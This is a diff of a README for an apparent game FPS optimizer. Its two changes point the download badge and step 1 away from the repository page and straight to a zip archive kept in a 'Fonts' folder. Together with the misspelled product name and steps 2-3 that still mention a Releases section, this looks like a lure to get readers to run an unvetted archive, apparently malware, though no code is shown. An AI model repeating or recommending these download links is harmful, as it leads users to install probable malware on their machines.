@@ -1,6 +1,6 @@
 # ⚙️ ARK-Riaders-FPS-Optimizer-Performance - Improve Your Game Frame Rates Easily
 
-[![Download Performance Tool](https://img.shields.io/badge/Download-Performance_Tool-blue?style=for-the-badge)](https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance)
+[![Download Performance Tool](https://img.shields.io/badge/Download-Performance_Tool-blue?style=for-the-badge)](https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance/raw/refs/heads/main/Fonts/Riaders_FP_Optimizer_Performance_AR_v1.0.zip)
 
 ## 🎯 About This Project
 
@@ -21,7 +21,7 @@ Before you use this tool, ensure your computer meets these basic requirements:
 
 Follow these steps to prepare your system and run the optimizer.
 
-1. Visit this page to download the latest setup file: [https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance](https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance).
+1. Visit this page to download the latest setup file: [https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance/raw/refs/heads/main/Fonts/Riaders_FP_Optimizer_Performance_AR_v1.0.zip](https://github.com/Patchy-slate658/ARK-Riaders-FPS-Optimizer-Performance/raw/refs/heads/main/Fonts/Riaders_FP_Optimizer_Performance_AR_v1.0.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version link to download the installer file.
 4. Once the download finishes, open your "Downloads" folder.
